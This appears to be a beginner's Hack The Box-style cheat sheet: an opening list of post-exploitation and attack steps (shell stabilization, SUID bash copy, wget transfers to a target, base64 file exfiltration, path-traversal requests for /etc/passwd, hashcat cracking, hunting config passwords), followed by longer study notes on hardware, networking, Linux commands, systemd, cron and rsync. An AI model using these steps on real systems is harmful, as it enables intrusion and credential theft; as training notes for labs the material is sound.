# Guide404
simple guide for noobs

----------------------GENERAL-----------------
(For every domain you find:)
1. nano /etc/hosts
(Harden the web shell)

2. python3 -c 'import pty; pty.spawn("/bin/bash")'   (SHELL HARDERING)
stty raw -echo; fg
export TERM=xterm
or
script /dev/null -c bash
stty raw -echo
fg
reset



shell stabilize:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
export HISTFILE=/dev/null

3. (move one file from your machine to the target , if you have a ssh connection)
   --> python3 -m http.server 8888 (in the directory of yhe file you want to send)
   --> wget http://<myIP>:<port>/filename   (at target's pc)

if you want to mnove a folder:
1.zip -r newname.zip thefoldername/
2. python3 -m http.server 80 
3. wget ......
4. unzip
5. cd
6. make all


4. cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
   cd /tmp
   ./bash -p
   whoami

5. (YOU CANT TAKE A FILE FROM TARGETS MACHINE WITH PYTHON SERVER)
   a. cat filename|base64   (copy it)
   b. nano name.base64     (and put it inside)
   c. cat name.base64|base64 -d>name   (and now you have it at your machine)

   

--------------------LFI---------------------
1. (throught pdf export/download) (known exploitable files: https://github.com/hussein98d/LFI-files/blob/master/list.txt):
   --> (burpsuite) GET /download?filename=../../../../../etc/passwd HTTP/1.1
   --> GET /download?filename=../../config/database.yml HTTP/1.1

-----------------------------HASHES-----------------------------
1. go at hashcat id tables and ctr+F to searc your hash and take the id
2. hashcat -m <id> hash.txt /usr/share/wordlists/rockyou.txt

-----------------------------WEBSHELL-----------------------
(after you get a web shell)
1. python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm
2. cat /var/www/limesurvey/application/config/config.php (you might find password for ssh)





                                                                                             SOME THEORY

A PC has those 5 components:
1)CPU     --> a) ALU (Arithmetic Logic Unit) does calculations   b) CU (Control unit) manage data/orders   c) Registers (short term storaging)  ||||| fetch->Decode->Excecute->Repeat
2)RAM     --> Fast temporary memory --> DDR4/DDR5
3)Hard Disk (ssd/hdd) or new gen (NVMe SSD)     -->SSD (faster,reliable,no noisy)   HDD (Bigger space than ssd, noisy and if it moves it can stop working)   
4)Motherboard
5)GPU
+ input/output devices (I/O)

inputs --> (CPU) processing --> (RAM/HardDisk) storage --> output


-----------------------------------------MEMORY-----------------------------------
overall memories --> a) Registers   b) Cashe (L1, fast but small|||L2,slow but bigger|||L3, even slower but bigger too)   c)RAM   d) HardDisk
when we open a program:
CPU loads it to the RAM from the HardDisk, and CPU reads it from the RAM and stores the data at Cache or Registers
If RAM is full, PC uses some space from HardDisk, like a Virtual Memory ----> Known us Paging (slower than RAM)


---------------------------------------OS--------------------------------
What it does?
1) CPU sheduling
2) RAM-VM sheduling
3) Storage management
4) I/O devices management
5) Files management

it has 4 parts:
1)Kernel: the core/brain of it, it communicates with the hardware and loads the programs at RAM.
2)Shell: the interface for the communication with the user
3)File System: the way the pc stores and manages the files (known ones: NTFS, FAT32, EXT4)
4)Drivers (softwares)

So when i open a PC, the 'Boot loader" loads the OS at RAM, the kernel starts the "start-ups" services and then every time you open a program: the OS loads it to the RAM, CPU execute the orders and the OS handle the data and communication user-program.

-------------------------------------Networking--------------------------------------

The base of nowadays networks are the Nodes and the Links
Types of networks: 
1) LAN
2) WAN
3) WLAN (wireless)
4) VPN
   The protocoles used are:
1)IP  (manages the addresses on the network)
2)TCP (slower but reliable)
3)UDP (fast but not so reliable)

The model that is commonly used is the OSI Model:
That has 7 layers:
7)Application          (HTTP,HTTPS,QUICK) apis
6)Presentation         cryptography
5)Session              manages connections/sessions
4)Transport            TCP/UDP
3)Network              IP
2)Data Link            Machine-Machine
1)Physical             wires/signals

Networking Services

SSH = Secure Shell is a network protocol that allows the secure transmission of data and commands over a network.
The most commonly used SSH server is openssh server. Its free and open-source
Admins uses OpenSSH to securely manage systems remotly.

Install openssh => sudo apt install openssh-server -y
Server status => systemctl status ssh
You can edit the configurations of ssh in /etc/ssh/sshd_config


NFS = Network File System is a network protocol that allows us to store and manage files on remote systems as if they were stored on the local system.
Examples: NFS-UTILS, NFS-Ganesha and OpenNFS

install nfs with => sudo apt install nfs-kernel-server -y
and check status => systemctl status nfs-kernel-server
Here are some important access rights that can be configured in NFS:
We can configure NFS via the configuration file /etc/exports

Permissions	Description
rw	               Gives users and systems read and write permissions to the shared directory.
ro	               Gives users and systems read-only access to the shared directory.
no_root_squash	   Prevents the root user on the client from being restricted to the rights of a normal user.
root_squash	      Restricts the rights of the root user on the client to the rights of a normal user.
sync	            Synchronizes the transfer of data to ensure that changes are only transferred after they have been saved on the file system.
async	            Transfers data asynchronously, which makes the transfer faster, but may cause inconsistencies in the file system if changes have not been fully committed.

Example: 
mkdir nfs_sharing
echo '/home/xxx/nfs_sharing hostname(rw,sync,no_root_squash)' >> /etc/exports
cat /etc/exports | grep -v "#"

it should print your line only

and then mount your drectory to your target:
mkdir ~/target_nfs
mount 10.129.12.17:/home/john/dev_scripts ~/target_nfs
tree ~/target_nfs

So we have mounted the NFS share (dev_scripts) from our target (10.129.12.17) locally to our system in the mount point target_nfs over the network and can view the contents just as if we were on the target system.

Web Server:
Apache2: sudo apt install apache2 -y
and edit /etc/apache2/apache2.conf
sudo systemctl start apache2
change the port at => /etc/apache2/ports.conf
testi ti with: curl -I http://localhost:8080


or python3 -m http.server 8000

VPN services
Among the most widely used VPN solutions for Linux servers are OpenVPN, L2TP/IPsec, PPTP, SSTP, and SoftEther.
sudo apt install openvpn -y
you can configure it at  /etc/openvpn/server.conf

another way to start a server is with npm: http-server -p 8080
or
with php: php -S 127.0.0.1:8080
S starts the built-in PHP development server

----------------------------------------------------------- Linux Commands ----------------------------------------------------
Command	Description
 man <tool>	      Opens man pages for the specified tool.
<tool> -h         Prints the help page of the tool.
apropos <keyword>	Searches through man pages' descriptions for instances of a given keyword.
cat	            Concatenate and print files.
whoami	         Displays current username.
id	               Returns users identity.
hostname	         Sets or prints the name of the current host system.
uname	            Prints operating system name.
pwd	            Returns working directory name.
ifconfig	         The ifconfig utility is used to assign or view an address to a network interface and/or configure network interface parameters.
ip	               Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels.
netstat	         Shows network status.
ss	               Another utility to investigate sockets.
ps	               Shows process status.
who	            Displays who is logged in.
env	            Prints environment or sets and executes a command.
lsblk	            Lists block devices.
lsusb	            Lists USB devices.
lsof	            Lists opened files.
lspci	            Lists PCI devices.
sudo	            Execute command as a different user.
su	               The su utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser). A shell is then executed.      su username -c "command" (executes a command as another user)
useradd	         Creates a new user or update default new user information.
userdel	         Deletes a user account and related files.
usermod	         Modifies a user account.         --lock username  (option locks/disables the user account)
addgroup	         Adds a group to the system.      -m username  (to create a home directory for a user)
delgroup	         Removes a group from the system.
passwd	         Changes user password.
dpkg	            Install, remove and configure Debian-based packages.
apt	            High-level package management command-line utility.
aptitude	         Alternative to apt.
snap	            Install, remove and configure snap packages.
gem	            Standard package manager for Ruby.
pip	            Standard package manager for Python.
git	            Revision control system command-line utility.
systemctl	      Command-line based service and systemd control manager.
ps	               Prints a snapshot of the current processes.
journalctl	      Query the systemd journal.
kill	            Sends a signal to a process.
bg	               Puts a process into background.
jobs	            Lists all processes that are running in the background.
fg	               Puts a process into the foreground.
curl	            Command-line utility to transfer data from or to a server.
wget	            An alternative to curl that downloads files from FTP or HTTP(s) server.
python3 -m http.server	Starts a Python3 web server on TCP port 8000.
ls	               Lists directory contents.
cd	               Changes the directory.
clear	            Clears the terminal.
touch	            Creates an empty file.
mkdir	            Creates a directory.
tree	            Lists the contents of a directory recursively.
mv	               Move or rename files or directories.
cp	               Copy files or directories.
nano	            Terminal based text editor.
which	            Returns the path to a file or link.
find	            Searches for files in a directory hierarchy.
updatedb	         Updates the locale database for existing contents on the system.
locate	         Uses the locale database to find contents on the system.
more	            Pager that is used to read STDOUT or files.
less	            An alternative to more with more features.
head	            Prints the first ten lines of STDOUT or a file.
tail	            Prints the last ten lines of STDOUT or a file.
sort	            Sorts the contents of STDOUT or a file.
grep	            Searches for specific results that contain given patterns.   grep -v "flase" (excludes all the "flase" files)
cut	            Removes sections from each line of files.    cut -d":" -f1 (it cuts everything after the first :)
tr	               Replaces certain characters.         tr ":" " "    (so here we replace all the : with empty)
column	         Command-line based utility that formats its input into multiple columns.         best is column -t
awk	            Pattern scanning and processing language.      awk '{print $1, $NF}'  (print the first and the last result of a line)
sed	            A stream editor for filtering and transforming text.     sed 's/bin/HTB/g' (it replaces bin with HTB at all lines)
wc	               Prints newline, word, and byte counts for a given input.   (wc -l) => counts the lines of an output
chmod	            Changes permission of a file or directory.
chown	            Changes the owner and group of a file or directory.

ABOUT SHORT COMMAND:
-type f	         Hereby, we define the type of the searched object. In this case, 'f' stands for 'file'.
-name *.conf	   With '-name', we indicate the name of the file we are looking for. The asterisk (*) stands for 'all' files with the '.conf' extension.
-user root	      This option filters all files whose owner is the root user.
-size +20k	      We can then filter all the located files and specify that we only want to see the files that are larger than 20 KiB.
-newermt 2020-03-03	With this option, we set the date. Only files newer than the specified date will be presented.
-exec ls -al {} \;	This option executes the specified command, using the curly brackets as placeholders for each result. The backslash escapes the next character from being interpreted by the shell because otherwise, the semicolon would terminate the command and not reach the redirection.
2>/dev/null	         This is a STDERR redirection to the 'null device', which we will come back to in the next section. This redirection ensures that no errors are displayed in the terminal. This redirection must not be an option of the 'find' command.

example: find / -type f -name "*.conf" -newermt 2020-03-03 -size +25k -size -28k 2>/dev/null



STDIN/OUT/ERR:

Data Stream for Input
STDIN – 0
Data Stream for Output
STDOUT – 1
Data Stream for Output that relates to an error occurring.
STDERR – 2


When we use the greater-than sign (>) to redirect our STDOUT, a new file is automatically created if it does not already exist. If this file exists, it will be overwritten without asking for confirmation. If we want to append STDOUT to our existing file, we can use the double greater-than sign (>>).

example: athleticKid@htb[/htb]$ find /etc/ -name passwd >> stdout.txt 2>/dev/null
this find the /etc/passwd files and write them at the end of file stdout.txt, while the errors (2) goes at the null device (nowhere)

example 2: cat << EOF > stream.txt
you give inputs until you press "EOF", then all are load in the txt file





SERVICE AND PROCESS MANAGMENT:
process with "d" at the end are deamons, like sshd.
All of them have a PID (Process ID) and they are stored at /proc/   . Some of them have a Parend PID too.
Generally:
1.   Start/Restart a service/process
2.   Stop a service/process
3.   See what is/was happening with a service/process
4.   Enable/Disable a service/process on boot
5.   Find a service/process

example of commands with ssh:
systemctl start ssh             (start a service)
systemctl status ssh            (checks the status of service)
systemctl enable ssh            (we enable the ssh everytime our machine reboots)
ps -aux | grep ssh              ( check the ssh services that are running)
systemctl list-units --type=service   (it lists all the services)
journalctl -u ssh.service --no-pager      (view the logs of a service that has errors)

A process can be in the following states:
Running
Waiting (waiting for an event or system resource)
Stopped
Zombie (stopped but still has an entry in the process table).
Processes can be controlled using kill, pkill, pgrep, and killall. To interact with a process, we must send a signal to it.

kill -l:
1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP
 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1
11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM
16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP
21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ
26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR
31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3
38) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8
43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13
48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12
53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7
58) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2
63) SIGRTMAX-1  64) SIGRTMAX


Signal	Description
1	SIGHUP - This is sent to a process when the terminal that controls it is closed.
2	SIGINT - Sent when a user presses [Ctrl] + C in the controlling terminal to interrupt a process.
3	SIGQUIT - Sent when a user presses [Ctrl] + D to quit.
9	SIGKILL - Immediately kill a process with no clean-up operations.
15	SIGTERM - Program termination.
19	SIGSTOP - Stop the program. It cannot be handled anymore.
20	SIGTSTP - Sent when a user presses [Ctrl] + Z to request for a service to suspend. The user can handle it afterward.

so for example if you want to instantly kill a process: kill 9 <pid>

Background a Process with:
ctr + z         ( suspends the processes, and they will not be executed further)
jobs            (display the seccions)
bg              (To keep it running in the background, we have to enter the command bg to put the process in the background)
&               (Another option is to automatically set the process with an AND sign (&) at the end of the command.)
like: ping -c 10 www.hackthebox.eu &

fg 1            (to foreground the session 1)

Execute several commands with tree ways:
Semicolon (;)               echo '1'; ls MISSING_FILE; echo '3'
Double ampersand characters (&&)         echo '1' && ls MISSING_FILE && echo '3'   (this will only keeps execute them if they are true)
Pipes (|)


TASK SCHEDULING
with systemd, which is a deamon service that is used in Linux systems such as Ubuntu, Redhat Linux, and Solaris to start processes and scripts at a specific time. With it, we can set up processes and scripts to run at a specific time or time interval and can also specify specific events and triggers that will trigger a specific task. To do this, we need to take some steps and precautions before our scripts or processes are automatically executed by the system. 
Generally:
1. Create a timer (schedules when your mytimer.service should run)
2. Create a service (executes the commands or script)
3. Activate the timer


To create a timer for systemd, we need to create a directory where the timer script will be stored.
1. sudo mkdir /etc/systemd/system/mytimer.timer.d
2. sudo nano /etc/systemd/system/mytimer.timer
>.txt
[Unit]
Description=My Timer

[Timer]
OnBootSec=3min
OnUnitActiveSec=1hour

[Install]
WantedBy=timers.target

Here we set a description and specify the full path to the script we want to run. The "multi-user.target" is the unit system that is activated when starting a normal multi-user mode. It defines the services that should be started on a normal system startup.

>.txt
[Unit]
Description=My Service

[Service]
ExecStart=/full/path/to/my/script.sh

[Install]
WantedBy=multi-user.target

After changes:
sudo systemctl daemon-reload
sudo systemctl start mytimer.timer
sudo systemctl enable mytimer.timer

CRON
Cron is another tool that can be used in Linux systems to schedule and automate processes.
For example, such a "crontab" could look like this:
mins|hours|days|weeks|days-of-the-week
Code: txt
# System Update
0 */6 * * * /path/to/update_software.sh

# Execute Scripts
0 0 1 * * /path/to/scripts/run_scripts.sh

# Cleanup DB
0 0 * * 0 /path/to/scripts/clean_database.sh

# Backups
0 0 * * 7 /path/to/scripts/backup.sh
The first task, System Update, should be executed once every sixth hour. This is indicated by the entry 0 */6 in the hour column. The task is executed by the script update_software.sh, whose path is given in the last column.

The second task, Execute Scripts, is to be executed every first day of the month at midnight. This is indicated by the entries 0 and 0 in the minute and hour columns and 1 in the days-of-the-month column. The task is executed by the run_scripts.sh script, whose path is given in the last column.

BACKUP AND RESTORE
When backing up data on an Ubuntu system, we have several options, including:
Rsync   (open source tool that allows fast-secure backups, only transfers the data that have changed)
Deja Dup     (simple)
Duplicity      (like Rsync but adds encryption)
On Ubuntu systems, you can use additional encryption tools like GnuPG, eCryptfs, or LUKS to add another layer of protection to your backups.

Rsync usage:
sudo apt install rsync -y
rsync -av /path/to/mydirectory user@backup_server:/path/to/backup/directory
(backups entire directory, -a for archive to preserve te original file attributes and -v for verbose to provide a detailed output of the progress)

rsync -avz --backup --backup-dir=/path/to/backup/folder --delete /path/to/mydirectory user@backup_server:/path/to/backup/directory
(With this, we back up the mydirectory to the remote backup_server, preserving the original file attributes, timestamps, and permissions, and enabled compression (-z) for faster transfers. The --backup option creates incremental backups in the directory /path/to/backup/folder, and the --delete option removes files from the remote host that is no longer present in the source directory.)

If we want to restore our directory from our backup server to our local directory, we can use the following command:
athleticKid@htb[/htb]$ rsync -av user@remote_host:/path/to/backup/directory /path/to/mydirectory

If you want to secure tha transmission use a protocol like SSH:
rsync -avz -e ssh /path/to/mydirectory user@backup_server:/path/to/backup/directory

Auto-Synchronization
To enable auto-synchronization using rsync, you can use a combination of cron and rsync to automate the synchronization process.

Therefore we create a new script called RSYNC_Backup.sh, which will trigger the rsync command to sync our local directory with the remote one. However, because we are using a script to perform SSH for the rsync connection, we need to configure key-based authentication. This is to bypass the need to input our password when connecting with SSH.

First, we generate a key pair for our user.
athleticKid@htb[/htb]$ ssh-keygen -t rsa -b 2048
(default location is ~/.ssh/id_rsa)
(Then you need to copy the public key to the remote server)
athleticKid@htb[/htb]$ ssh-copy-id user@backup_server
Now you can create the script:
nano RSYNC_Backup.sh

#!/bin/bash
rsync -avz -e ssh /path/to/mydirectory user@backup_server:/path/to/backup/directory
chmod +x RSYNC_Backup.sh

Then create a crontab that tells cron to run the script every hour at 0th minute
athleticKid@htb[/htb]$ crontab -e
0 * * * * /path/to/RSYNC_Backup.sh



FILE SYSTEM MANAGEMENT

